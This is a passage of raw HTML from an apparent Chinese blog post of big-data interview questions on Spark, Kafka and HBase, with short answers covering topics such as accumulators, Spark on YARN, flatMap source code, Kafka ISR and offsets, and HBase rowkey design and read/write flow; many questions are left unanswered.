id="40-数据倾斜可能会导致哪些问题，如何监控和排查，在设计之初，要考虑哪些来避免"><a href="#40-数据倾斜可能会导致哪些问题，如何监控和排查，在设计之初，要考虑哪些来避免" class="headerlink" title="40.数据倾斜可能会导致哪些问题，如何监控和排查，在设计之初，要考虑哪些来避免"></a>40.数据倾斜可能会导致哪些问题，如何监控和排查，在设计之初，要考虑哪些来避免</h2><h2 id="41-有一千万条短信，有重复，以文本文件的形式保存，一行一条数据，请用五分钟时间，找出重复出现最多的前10条"><a href="#41-有一千万条短信，有重复，以文本文件的形式保存，一行一条数据，请用五分钟时间，找出重复出现最多的前10条" class="headerlink" title="41.有一千万条短信，有重复，以文本文件的形式保存，一行一条数据，请用五分钟时间，找出重复出现最多的前10条"></a>41.有一千万条短信，有重复，以文本文件的形式保存，一行一条数据，请用五分钟时间，找出重复出现最多的前10条</h2><h2 id="42-现有一文件，格式如下，请用spark统计每个单词出现的次数"><a href="#42-现有一文件，格式如下，请用spark统计每个单词出现的次数" class="headerlink" title="42.现有一文件，格式如下，请用spark统计每个单词出现的次数"></a>42.现有一文件，格式如下，请用spark统计每个单词出现的次数</h2><blockquote><p>18619304961，18619304064，186193008，186193009</p><p>18619304962，18619304065，186193007，186193008</p><p>18619304963，18619304066，186193006，186193010</p></blockquote><h2 id="-7"><a href="#-7" class="headerlink" title></a></h2><h2 id="43-共享变量和累加器"><a href="#43-共享变量和累加器" class="headerlink" title="43.共享变量和累加器"></a>43.共享变量和累加器</h2><p>累加器（accumulator）是 Spark 中提供的一种分布式的变量机制，其原理类似于mapreduce，即分布式的改变，然后聚合这些改变。累加器的一个常见用途是在调试时对作业执行过程中的事件进行计数。而广播变量用来高效分发较大的对象。</p><p>共享变量出现的原因：</p><p>通常在向 Spark 传递函数时，比如使用 map() 函数或者用 filter() 传条件时，可以使用驱动器程序中定义的变量，但是集群中运行的每个任务都会得到这些变量的一份新的副本，更新这些副本的值也不会影响驱动器中的对应变量。</p><p>Spark 的两个共享变量，累加器与广播变量，分别为结果聚合与广播这两种常见的通信模式突破了这一限制。</p><h2 id="-8"><a href="#-8" class="headerlink" title></a></h2><h2 id="44-当-Spark-涉及到数据库的操作时，如何减少-Spark-运行中的数据库连接数？"><a href="#44-当-Spark-涉及到数据库的操作时，如何减少-Spark-运行中的数据库连接数？" class="headerlink" title="44.当 Spark 涉及到数据库的操作时，如何减少 Spark 运行中的数据库连接数？"></a>44.当 Spark 涉及到数据库的操作时，如何减少 Spark 运行中的数据库连接数？</h2><p>使用 foreachPartition 代替 foreach，在 foreachPartition 内获取数据库的连接。</p><h2 id="-9"><a href="#-9" class="headerlink" title></a></h2><h2 id="45-特别大的数据，怎么发送到excutor中？"><a href="#45-特别大的数据，怎么发送到excutor中？" class="headerlink" title="45.特别大的数据，怎么发送到excutor中？"></a>45.特别大的数据，怎么发送到excutor中？</h2><h2 id="-10"><a href="#-10" class="headerlink" title></a></h2><h2 id="46-spark调优都做过哪些方面？"><a href="#46-spark调优都做过哪些方面？" class="headerlink" title="46.spark调优都做过哪些方面？"></a>46.spark调优都做过哪些方面？</h2><h2 id="-11"><a href="#-11" class="headerlink" title></a></h2><h2 id="47-spark任务为什么会被yarn-kill掉？"><a href="#47-spark任务为什么会被yarn-kill掉？" class="headerlink" title="47.spark任务为什么会被yarn kill掉？"></a>47.spark任务为什么会被yarn kill掉？</h2><h2 id="-12"><a href="#-12" class="headerlink" title></a></h2><h2 id="48-Spark-on-Yarn作业执行流程？yarn-client和yarn-cluster有什么区别？"><a href="#48-Spark-on-Yarn作业执行流程？yarn-client和yarn-cluster有什么区别？" class="headerlink" title="48.Spark on Yarn作业执行流程？yarn-client和yarn-cluster有什么区别？"></a>48.Spark on Yarn作业执行流程？yarn-client和yarn-cluster有什么区别？</h2><p><strong>Spark on Yarn作业执行流程？</strong></p><p>1.Spark Yarn Client 向 Yarn 中提交应用程序。<br>2.ResourceManager 收到请求后，在集群中选择一个 NodeManager，并为该应用程序分配一个 Container，在这个 Container 中启动应用程序的 ApplicationMaster， ApplicationMaster 进行 SparkContext 等的初始化。<br>3.ApplicationMaster 向 ResourceManager 注册，这样用户可以直接通过 ResourceManager 查看应用程序的运行状态，然后它将采用轮询的方式通过RPC协议为各个任务申请资源，并监控它们的运行状态直到运行结束。<br>4.ApplicationMaster 申请到资源（也就是Container）后，便与对应的 NodeManager 通信，并在获得的 Container 中启动 CoarseGrainedExecutorBackend，启动后会向 ApplicationMaster 中的 SparkContext 注册并申请 Task。<br>5.ApplicationMaster 中的 SparkContext 分配 Task 给 CoarseGrainedExecutorBackend 执行，CoarseGrainedExecutorBackend 运行 Task 并向ApplicationMaster 汇报运行的状态和进度，以让 ApplicationMaster 随时掌握各个任务的运行状态，从而可以在任务失败时重新启动任务。<br>6.应用程序运行完成后，ApplicationMaster 向 ResourceManager申请注销并关闭自己。</p><p><strong>yarn-client和yarn-cluster有什么区别？</strong></p><p>1.理解YARN-Client和YARN-Cluster深层次的区别之前先清楚一个概念：Application Master。在YARN中，每个Application实例都有一个ApplicationMaster进程，它是Application启动的第一个容器。它负责和ResourceManager打交道并请求资源，获取资源之后告诉NodeManager为其启动Container。从深层次的含义讲YARN-Cluster和YARN-Client模式的区别其实就是ApplicationMaster进程的区别 2. YARN-Cluster模式下，Driver运行在AM(Application Master)中，它负责向YARN申请资源，并监督作业的运行状况。当用户提交了作业之后，就可以关掉Client，作业会继续在YARN上运行，因而YARN-Cluster模式不适合运行交互类型的作业 3. YARN-Client模式下，Application Master仅仅向YARN请求Executor，Client会和请求的Container通信来调度他们工作，也就是说Client不能离开</p><h2 id="-13"><a href="#-13" class="headerlink" title></a></h2><h2 id="49-Flatmap底层编码实现？"><a href="#49-Flatmap底层编码实现？" class="headerlink" title="49.Flatmap底层编码实现？"></a>49.Flatmap底层编码实现？</h2><p><strong>Spark flatMap 源码：</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   *  Return a new RDD by first applying a function to all elements of this</span></span><br><span class="line"><span class="comment">   *  RDD, and then flattening the results.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">flatMap</span></span>[<span class="type">U</span>: <span class="type">ClassTag</span>](f: <span class="type">T</span> =&gt; <span class="type">TraversableOnce</span>[<span class="type">U</span>]): <span class="type">RDD</span>[<span class="type">U</span>] = withScope &#123;</span><br><span class="line">    <span class="keyword">val</span> cleanF = sc.clean(f)</span><br><span class="line">    <span class="keyword">new</span> <span class="type">MapPartitionsRDD</span>[<span class="type">U</span>, <span class="type">T</span>](<span class="keyword">this</span>, (context, pid, iter) =&gt; iter.flatMap(cleanF))</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong>Scala flatMap 源码：</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/** Creates a new iterator by applying a function to all values produced by this iterator</span></span><br><span class="line"><span class="comment">   *  and concatenating the results.</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   *  @param f the function to apply on each element.</span></span><br><span class="line"><span class="comment">   *  @return  the iterator resulting from applying the given iterator-valued function</span></span><br><span class="line"><span class="comment">   *           `f` to each value produced by this iterator and concatenating the results.</span></span><br><span class="line"><span class="comment">   *  @note    Reuse: $consumesAndProducesIterator</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">flatMap</span></span>[<span class="type">B</span>](f: <span class="type">A</span> =&gt; <span class="type">GenTraversableOnce</span>[<span class="type">B</span>]): <span class="type">Iterator</span>[<span class="type">B</span>] = <span class="keyword">new</span> <span class="type">AbstractIterator</span>[<span class="type">B</span>] &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">var</span> cur: <span class="type">Iterator</span>[<span class="type">B</span>] = empty</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">def</span> <span class="title">nextCur</span></span>() &#123; cur = f(self.next()).toIterator &#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hasNext</span></span>: <span class="type">Boolean</span> = &#123;</span><br><span class="line">      <span class="comment">// Equivalent to cur.hasNext || self.hasNext &amp;&amp; &#123; nextCur(); hasNext &#125;</span></span><br><span class="line">      <span class="comment">// but slightly shorter bytecode (better JVM inlining!)</span></span><br><span class="line">      <span class="keyword">while</span> (!cur.hasNext) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!self.hasNext) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        nextCur()</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span></span>(): <span class="type">B</span> =&lt;span style=<span class="string">"color:#ffffff"</span>&gt; &lt;span style=<span class="string">"background-color:rgb(255,0,0)"</span>&gt;(<span class="keyword">if</span> (hasNext) cur <span class="keyword">else</span> empty).next()&lt;/span&gt;&lt;/span&gt;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>flatMap其实就是将RDD里的每一个元素执行自定义函数f，这时这个元素的结果转换成iterator，最后将这些再拼接成一个</p><p>新的RDD，也可以理解成原本的每个元素由横向执行函数f后再变为纵向。画红部分一直在回调，当RDD内没有元素为止。</p><p>50.spark_1.X与spark_2.X区别 </p><p>51.说说spark与flink</p><h1 id="四-Kafka"><a href="#四-Kafka" class="headerlink" title="四.Kafka"></a>四.Kafka</h1><h2 id="1-Kafka名词解释和工作方式"><a href="#1-Kafka名词解释和工作方式" class="headerlink" title="1.Kafka名词解释和工作方式"></a>1.Kafka名词解释和工作方式</h2><ol><li>Producer ：消息生产者，就是向kafka broker发消息的客户端。</li><li>Consumer ：消息消费者，向kafka broker取消息的客户端</li><li>Topic ：咋们可以理解为一个队列。</li><li>Consumer Group （CG）：这是kafka用来实现一个topic消息的广播（发给所有的consumer）和单播（发给任意一个consumer）的手段。一个topic可以有多个CG。topic的消息会复制（不是真的复制，是概念上的）到所有的CG，但每个partion只会把消息发给该CG中的一个consumer。如果需要实现广播，只要每个consumer有一个独立的CG就可以了。要实现单播只要所有的consumer在同一个CG。用CG还可以将consumer进行自由的分组而不需要多次发送消息到不同的topic。</li><li>Broker ：一台kafka服务器就是一个broker。一个集群由多个broker组成。一个broker可以容纳多个topic。</li><li>Partition：为了实现扩展性，一个非常大的topic可以分布到多个broker（即服务器）上，一个topic可以分为多个partition，每个partition是一个有序的队列。partition中的每条消息都会被分配一个有序的id（offset）。kafka只保证按一个partition中的顺序将消息发给consumer，不保证一个topic的整体（多个partition间）的顺序。</li><li>Offset：kafka的存储文件都是按照offset.kafka来命名，用offset做名字的好处是方便查找。例如你想找位于2049的位置，只要找到2048.kafka的文件即可。当然the first offset就是00000000000.kafka</li></ol><h2 id="-14"><a href="#-14" class="headerlink" title></a></h2><h2 id="2-Consumer与topic关系"><a href="#2-Consumer与topic关系" class="headerlink" title="2.Consumer与topic关系"></a>2.Consumer与topic关系</h2><p>本质上kafka只支持Topic；</p><p>每个group中可以有多个consumer，每个consumer属于一个consumer group；</p><p>通常情况下，一个group中会包含多个consumer，这样不仅可以提高topic中消息的并发消费能力，而且还能提高”故障容错”性，如果group中的某个consumer失效那么其消费的partitions将会有其他consumer自动接管。</p><p>对于Topic中的一条特定的消息，只会被订阅此Topic的每个group中的其中一个consumer消费，此消息不会发送给一个group的多个consumer；</p><p>那么一个group中所有的consumer将会交错的消费整个Topic，每个group中consumer消息消费互相独立，我们可以认为一个group是一个”订阅”者。</p><p>在kafka中,一个partition中的消息只会被group中的一个consumer消费(同一时刻)；</p><p>一个Topic中的每个partions，只会被一个”订阅者”中的一个consumer消费，不过一个consumer可以同时消费多个partitions中的消息。</p><p>kafka的设计原理决定,对于一个topic，同一个group中不能有多于partitions个数的consumer同时消费，否则将意味着某些consumer将无法得到消息。</p><p>kafka只能保证一个partition中的消息被某个consumer消费时是顺序的；事实上，从Topic角度来说,当有多个partitions时,消息仍不是全局有序的。</p><h2 id="3-kafka中生产数据的时候，如何保证写入的容错性？"><a href="#3-kafka中生产数据的时候，如何保证写入的容错性？" class="headerlink" title="\3.**kafka中生产数据的时候，如何保证写入的容错性？"></a><strong><em>\</em>3.**</strong>kafka中生产数据的时候，如何保证写入的容错性？</h2><p>设置发送数据是否需要服务端的反馈,有三个值0,1,-1</p><p>0: producer不会等待broker发送ack</p><p>1: 当leader接收到消息之后发送ack</p><p>-1: 当所有的follower都同步消息成功后发送ack</p><p>request.required.acks=0</p><h2 id="4-如何保证kafka消费者消费数据是全局有序的"><a href="#4-如何保证kafka消费者消费数据是全局有序的" class="headerlink" title="4.如何保证kafka消费者消费数据是全局有序的"></a>4.如何保证kafka消费者消费数据是全局有序的</h2><p>伪命题</p><p>每个分区内，每条消息都有一个offset，故只能保证分区内有序。</p><p>如果要全局有序的，必须保证生产有序，存储有序，消费有序。</p><p>由于生产可以做集群，存储可以分片，消费可以设置为一个consumerGroup，要保证全局有序，就需要保证每个环节都有序。</p><p>只有一个可能，就是一个生产者，一个partition，一个消费者。这种场景和大数据应用场景相悖。</p><h2 id="5-有两个数据源，一个记录的是广告投放给用户的日志，一个记录用户访问日志，另外还有一个固定的用户基础表记录用户基本信息（比如学历，年龄等等）。现在要分析广告投放对与哪类用户更有效，请采用熟悉的技术描述解决思路。另外如果两个数据源都是实时数据源（比如来自kafka），他们数据在时间上相差5分钟，需要哪些调整来解决实时分析问题？"><a href="#5-有两个数据源，一个记录的是广告投放给用户的日志，一个记录用户访问日志，另外还有一个固定的用户基础表记录用户基本信息（比如学历，年龄等等）。现在要分析广告投放对与哪类用户更有效，请采用熟悉的技术描述解决思路。另外如果两个数据源都是实时数据源（比如来自kafka），他们数据在时间上相差5分钟，需要哪些调整来解决实时分析问题？" class="headerlink" title="5.有两个数据源，一个记录的是广告投放给用户的日志，一个记录用户访问日志，另外还有一个固定的用户基础表记录用户基本信息（比如学历，年龄等等）。现在要分析广告投放对与哪类用户更有效，请采用熟悉的技术描述解决思路。另外如果两个数据源都是实时数据源（比如来自kafka），他们数据在时间上相差5分钟，需要哪些调整来解决实时分析问题？"></a>5.有两个数据源，一个记录的是广告投放给用户的日志，一个记录用户访问日志，另外还有一个固定的用户基础表记录用户基本信息（比如学历，年龄等等）。现在要分析广告投放对与哪类用户更有效，请采用熟悉的技术描述解决思路。另外如果两个数据源都是实时数据源（比如来自kafka），他们数据在时间上相差5分钟，需要哪些调整来解决实时分析问题？</h2><h2 id="6-Kafka和SparkStreaing如何集成"><a href="#6-Kafka和SparkStreaing如何集成" class="headerlink" title="6.Kafka和SparkStreaing如何集成?"></a>6.Kafka和SparkStreaing如何集成?</h2><h2 id="7-列举Kafka的优点，简述Kafka为什么可以做到每秒数十万甚至上百万消息的高效分发？"><a href="#7-列举Kafka的优点，简述Kafka为什么可以做到每秒数十万甚至上百万消息的高效分发？" class="headerlink" title="7.列举Kafka的优点，简述Kafka为什么可以做到每秒数十万甚至上百万消息的高效分发？"></a>7.列举Kafka的优点，简述Kafka为什么可以做到每秒数十万甚至上百万消息的高效分发？</h2><h2 id="8-为什么离线分析要用kafka？"><a href="#8-为什么离线分析要用kafka？" class="headerlink" title="8.为什么离线分析要用kafka？"></a>8.为什么离线分析要用kafka？</h2><p>Kafka的作用是解耦，如果直接从日志服务器上采集的话，实时离线都要采集，等于要采集两份数据，而使用了kafka的话，只需要从日志服务器上采集一份数据，然后在kafka中使用不同的两个组读取就行了</p><h2 id="-15"><a href="#-15" class="headerlink" title></a></h2><h2 id="9-Kafka怎么进行监控"><a href="#9-Kafka怎么进行监控" class="headerlink" title="9.Kafka怎么进行监控?"></a>9.Kafka怎么进行监控?</h2><p>Kafka Manager</p><h2 id="10-Kafka与传统的消息队列服务有很么不同"><a href="#10-Kafka与传统的消息队列服务有很么不同" class="headerlink" title="10.Kafka与传统的消息队列服务有很么不同"></a>10.Kafka与传统的消息队列服务有很么不同</h2><h2 id="11-Kafka-api-low-level与high-level有什么区别，使用low-level需要处理哪些细节"><a href="#11-Kafka-api-low-level与high-level有什么区别，使用low-level需要处理哪些细节" class="headerlink" title="11.Kafka api  low-level与high-level有什么区别，使用low-level需要处理哪些细节"></a>11.Kafka api  low-level与high-level有什么区别，使用low-level需要处理哪些细节</h2><h2 id="12-Kafka的ISR副本同步队列"><a href="#12-Kafka的ISR副本同步队列" class="headerlink" title="12.Kafka的ISR副本同步队列"></a>12.Kafka的ISR副本同步队列</h2><p>ISR（In-Sync Replicas），副本同步队列。ISR中包括Leader和Follower。如果Leader进程挂掉，会在ISR队列中选择一个服务作为新的Leader。有replica.lag.max.messages（延迟条数）和replica.lag.time.max.ms（延迟时间）两个参数决定一台服务是否可以加入ISR副本队列，在0.10版本移除了replica.lag.max.messages参数，防止服务频繁的进去队列。</p><p>任意一个维度超过阈值都会把Follower剔除出ISR，存入OSR（Outof-Sync Replicas）列表，新加入的Follower也会先存放在OSR中。</p><h2 id="-16"><a href="#-16" class="headerlink" title></a></h2><h2 id="13-Kafka消息数据积压，Kafka消费能力不足怎么处理？"><a href="#13-Kafka消息数据积压，Kafka消费能力不足怎么处理？" class="headerlink" title="13.Kafka消息数据积压，Kafka消费能力不足怎么处理？"></a>13.Kafka消息数据积压，Kafka消费能力不足怎么处理？</h2><p>1）如果是Kafka消费能力不足，则可以考虑增加Topic的分区数，并且同时提升消费组的消费者数量，消费者数=分区数。（两者缺一不可）</p><p>2）如果是下游的数据处理不及时：提高每批次拉取的数量。批次拉取数据过少（拉取数据/处理时间&lt;生产速度），使处理的数据小于生产的数据，也会造成数据积压。</p><h2 id="14-Kafka中的ISR、AR又代表什么？"><a href="#14-Kafka中的ISR、AR又代表什么？" class="headerlink" title="14.Kafka中的ISR、AR又代表什么？"></a>14.Kafka中的ISR、AR又代表什么？</h2><p> ISR：in-sync replica set (ISR)，与leader保持同步的follower集合</p><p>  AR：分区的所有副本</p><h2 id="-17"><a href="#-17" class="headerlink" title></a></h2><h2 id="15-Kafka中的HW、LEO等分别代表什么？"><a href="#15-Kafka中的HW、LEO等分别代表什么？" class="headerlink" title="15.Kafka中的HW、LEO等分别代表什么？"></a>15.Kafka中的HW、LEO等分别代表什么？</h2><p>LEO：每个副本的最后条消息的offset</p><p>  HW：一个分区中所有副本最小的offset</p><h2 id="-18"><a href="#-18" class="headerlink" title></a></h2><h2 id="16-哪些情景会造成消息漏消费？"><a href="#16-哪些情景会造成消息漏消费？" class="headerlink" title="16.哪些情景会造成消息漏消费？"></a>16.哪些情景会造成消息漏消费？</h2><p>先提交offset，后消费，有可能造成数据的重复</p><h2 id="17-当你使用kafka-topics-sh创建了一个topic之后，Kafka背后会执行什么逻辑？"><a href="#17-当你使用kafka-topics-sh创建了一个topic之后，Kafka背后会执行什么逻辑？" class="headerlink" title="17.当你使用kafka-topics.sh创建了一个topic之后，Kafka背后会执行什么逻辑？"></a>17.当你使用kafka-topics.sh创建了一个topic之后，Kafka背后会执行什么逻辑？</h2><p> 1）会在zookeeper中的/brokers/topics节点下创建一个新的topic节点，如：/brokers/topics/first</p><p>  2）触发Controller的监听程序</p><p>  3）kafka Controller 负责topic的创建工作，并更新metadata cache</p><h2 id="18-topic的分区数可不可以增加？如果可以怎么增加？如果不可以，那又是为什么？"><a href="#18-topic的分区数可不可以增加？如果可以怎么增加？如果不可以，那又是为什么？" class="headerlink" title="18.topic的分区数可不可以增加？如果可以怎么增加？如果不可以，那又是为什么？"></a>18.topic的分区数可不可以增加？如果可以怎么增加？如果不可以，那又是为什么？</h2><p>可以增加</p><p>bin/kafka-topics.sh –zookeeper localhost:2181/kafka –alter –topic topic-config –partitions 3</p><h2 id="19-topic的分区数可不可以减少？如果可以怎么减少？如果不可以，那又是为什么？"><a href="#19-topic的分区数可不可以减少？如果可以怎么减少？如果不可以，那又是为什么？" class="headerlink" title="19.topic的分区数可不可以减少？如果可以怎么减少？如果不可以，那又是为什么？"></a>19.topic的分区数可不可以减少？如果可以怎么减少？如果不可以，那又是为什么？</h2><p>不可以减少，被删除的分区数据难以处理。</p><h2 id="20-Kafka有内部的topic吗？如果有是什么？有什么所用？"><a href="#20-Kafka有内部的topic吗？如果有是什么？有什么所用？" class="headerlink" title="20.Kafka有内部的topic吗？如果有是什么？有什么所用？"></a>20.Kafka有内部的topic吗？如果有是什么？有什么所用？</h2><p> __consumer_offsets,保存消费者offset</p><h2 id="21-聊一聊Kafka-Controller的作用？"><a href="#21-聊一聊Kafka-Controller的作用？" class="headerlink" title="21.聊一聊Kafka Controller的作用？"></a>21.聊一聊Kafka Controller的作用？</h2><p>负责管理集群broker的上下线，所有topic的分区副本分配和leader选举等工作。</p><h2 id="22-失效副本是指什么？有那些应对措施？"><a href="#22-失效副本是指什么？有那些应对措施？" class="headerlink" title="22.失效副本是指什么？有那些应对措施？"></a>22.失效副本是指什么？有那些应对措施？</h2><p>不能及时与leader同步，暂时踢出ISR，等其追上leader之后再重新加入</p><h1 id="五-Hbase"><a href="#五-Hbase" class="headerlink" title="五.Hbase"></a>五.Hbase</h1><h2 id="1-Hbase调优"><a href="#1-Hbase调优" class="headerlink" title="1.Hbase调优"></a>1.Hbase调优</h2><ul><li>高可用</li></ul><blockquote><p>在HBase中Hmaster负责监控RegionServer的生命周期，均衡RegionServer的负载，如果Hmaster挂掉了，那么整个HBase集群将陷入不健康的状态，并且此时的工作状态并不会维持太久。所以HBase支持对Hmaster的高可用配置。</p></blockquote><ul><li>预分区</li></ul><p>​    每一个region维护着startRow与endRowKey，如果加入的数据符合某个region维护的rowKey范围，则该数据交给这个region      维护。那么依照这个原则，我们可以将数据所要投放的分区提前大致的规划好，以提高HBase性能。</p><ul><li>优化RowKey设计</li></ul><p>​    一条数据的唯一标识就是rowkey，那么这条数据存储于哪个分区，取决于rowkey处于哪个一个预分区的区间内，设计rowkey     的主要目的 ，就是让数据均匀的分布于所有的region中，在一定程度上防止数据倾斜</p><ul><li>内存优化</li></ul><blockquote><p>HBase操作过程中需要大量的内存开销，毕竟Table是可以缓存在内存中的，一般会分配整个可用内存的70%给HBase的Java堆。但是不建议分配非常大的堆内存，因为GC过程持续太久会导致RegionServer处于长期不可用状态，一般16~48G内存就可以了，如果因为框架占用内存过高导致系统内存不足，框架一样会被系统服务拖死。</p></blockquote><h2 id="-19"><a href="#-19" class="headerlink" title></a></h2><h2 id="2-hbase的rowkey怎么创建好？列族怎么创建比较好？"><a href="#2-hbase的rowkey怎么创建好？列族怎么创建比较好？" class="headerlink" title="2.hbase的rowkey怎么创建好？列族怎么创建比较好？"></a>2.hbase的rowkey怎么创建好？列族怎么创建比较好？</h2><p>hbase存储时，数据按照Row key的字典序(byte order)排序存储。设计key时，要充分排序存储这个特性，将经常一起读取的行存储放到一起。(位置相关性)</p><p>一个列族在数据底层是一个文件，所以将经常一起查询的列放到一个列族中，列族尽量少，减少文件的寻址时间。</p><p><strong>设计原则</strong></p><p>1）rowkey 长度原则</p><p>2）rowkey 散列原则</p><p>3）rowkey 唯一原则</p><p><strong>如何设计</strong></p><p>1）生成随机数、hash、散列值</p><p>2）字符串反转</p><p>3) 字符串拼接</p><h2 id="3-hbase过滤器实现用途"><a href="#3-hbase过滤器实现用途" class="headerlink" title="3.hbase过滤器实现用途"></a>3.hbase过滤器实现用途</h2><p>增强hbase查询数据的功能</p><p>减少服务端返回给客户端的数据量</p><h2 id="4-HBase宕机如何处理"><a href="#4-HBase宕机如何处理" class="headerlink" title="4.HBase宕机如何处理"></a>4.HBase宕机如何处理</h2><p>答：宕机分为HMaster宕机和HRegisoner宕机，如果是HRegisoner宕机，HMaster会将其所管理的region重新分布到其他活动的RegionServer上，由于数据和日志都持久在HDFS中，该操作不会导致数据丢失。所以数据的一致性和安全性是有保障的。</p><p>如果是HMaster宕机，HMaster没有单点问题，HBase中可以启动多个HMaster，通过Zookeeper的Master Election机制保证总有一个Master运行。即ZooKeeper会保证总会有一个HMaster在对外提供服务。</p><h2 id="5-hive跟hbase的区别是？"><a href="#5-hive跟hbase的区别是？" class="headerlink" title="5.hive跟hbase的区别是？"></a>5.hive跟hbase的区别是？</h2><p><strong>共同点：</strong><br>1.hbase与hive都是架构在hadoop之上的。都是用hadoop作为底层存储</p><p><strong>区别：</strong><br>2.Hive是建立在Hadoop之上为了减少MapReduce jobs编写工作的批处理系统，HBase是为了支持弥补Hadoop对实时操作的缺陷的项目 。<br>3.想象你在操作RMDB数据库，如果是全表扫描，就用Hive+Hadoop,如果是索引访问，就用HBase+Hadoop 。<br>4.Hive query就是MapReduce jobs可以从5分钟到数小时不止，HBase是非常高效的，肯定比Hive高效的多。<br>5.Hive本身不存储和计算数据，它完全依赖于HDFS和MapReduce，Hive中的表纯逻辑。<br>6.hive借用hadoop的MapReduce来完成一些hive中的命令的执行<br>7.hbase是物理表，不是逻辑表，提供一个超大的内存hash表，搜索引擎通过它来存储索引，方便查询操作。<br>8.hbase是列存储。<br>9.hdfs作为底层存储，hdfs是存放文件的系统，而Hbase负责组织文件。<br>10.hive需要用到hdfs存储文件，需要用到MapReduce计算框架。</p><h2 id="-20"><a href="#-20" class="headerlink" title></a></h2><h2 id="6-hbase写流程"><a href="#6-hbase写流程" class="headerlink" title="6.hbase写流程"></a>6.hbase写流程</h2><p><img src="/2020/08/28/2020%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9C%9F%E9%A2%98%E6%80%BB%E7%BB%93(%E9%99%84%E7%AD%94%E6%A1%88)/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p><p>1/ 客户端要连接zookeeper, 从zk的/hbase节点找到hbase:meta表所在的regionserver（host:port）;</p><p>2/ regionserver扫描hbase:meta中的每个region的起始行健，对比r000001这条数据在那个region的范围内；</p><p>3/ 从对应的 info:server key中存储了region是有哪个regionserver(host:port)在负责的；</p><p>4/ 客户端直接请求对应的regionserver；</p><p>5/ regionserver接收到客户端发来的请求之后，就会将数据写入到region中</p><h2 id="-21"><a href="#-21" class="headerlink" title></a></h2><h2 id="7-hbase读流程"><a href="#7-hbase读流程" class="headerlink" title="7.hbase读流程"></a>7.hbase读流程</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/dXCnejTRMLdfqmBAvcKIhLA5ZUrVlzNciaUzIOjFvoZxVUUUEwlEkKwBHKnaR9ecRmro6XYCTlWKK7FdKyVJSYA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><p>1/ 首先Client连接zookeeper, 找到hbase:meta表所在的regionserver;</p><p>2/ 请求对应的regionserver，扫描hbase:meta表，根据namespace、表名和rowkey在meta表中找到r00001所在的region是由那个regionserver负责的；</p><p>3/找到这个region对应的regionserver</p><p>4/ regionserver收到了请求之后，扫描对应的region返回数据到Client</p><p>(先从MemStore找数据，如果没有，再到BlockCache里面读；BlockCache还没有，再到StoreFile上读(为了读取的效率)；</p><p>如果是从StoreFile里面读取的数据，不是直接返回给客户端，而是先写入BlockCache，再返回给客户端。)</p><h2 id="8-hbase数据flush过程"><a href="#8-hbase数据flush过程" class="headerlink" title="8.hbase数据flush过程"></a>8.hbase数据flush过程</h2><p>1）当MemStore数据达到阈值（默认是128M，老版本是64M），将数据刷到硬盘，将内存中的数据删除，同时删除HLog中的历史数据；</p><p>2）并将数据存储到HDFS中；</p><p>3）在HLog中做标记点。</p><h2 id="-22"><a href="#-22" class="headerlink" title></a></h2><h2 id="9-数据合并过程"><a href="#9-数据合并过程" class="headerlink" title="9.数据合并过程"></a>9.数据合并过程</h2><ol><li>当数据块达到4块，hmaster将数据块加载到本地，进行合并</li><li>当合并的数据超过256M，进行拆分，将拆分后的region分配给不同的hregionserver管理</li><li>当hregionser宕机后，将hregionserver上的hlog拆分，然后分配给不同的hregionserver加载，修改.META.</li><li>注意：hlog会同步到hdfs</li></ol><h2 id="-23"><a href="#-23" class="headerlink" title></a></h2><h2 id="10-Hmaster和Hgionserver职责"><a href="#10-Hmaster和Hgionserver职责" class="headerlink" title="10.Hmaster和Hgionserver职责"></a>10.Hmaster和Hgionserver职责</h2><p>Hmaster</p><p>1、管理用户对Table的增、删、改、查操作；</p><p>2、记录region在哪台Hregion server上</p><p>3、在Region Split后，负责新Region的分配；</p><p>4、新机器加入时，管理HRegion Server的负载均衡，调整Region分布</p><p>5、在HRegion Server宕机后，负责失效HRegion Server 上的Regions迁移。</p><p>Hgionserver</p><p>HRegion Server主要负责响应用户I/O请求，向HDFS文件系统中读写数据，是HBASE中最核心的模块。</p><p>HRegion Server管理了很多table的分区，也就是region。</p><h2 id="11-HBase列族和region的关系？"><a href="#11-HBase列族和region的关系？" class="headerlink" 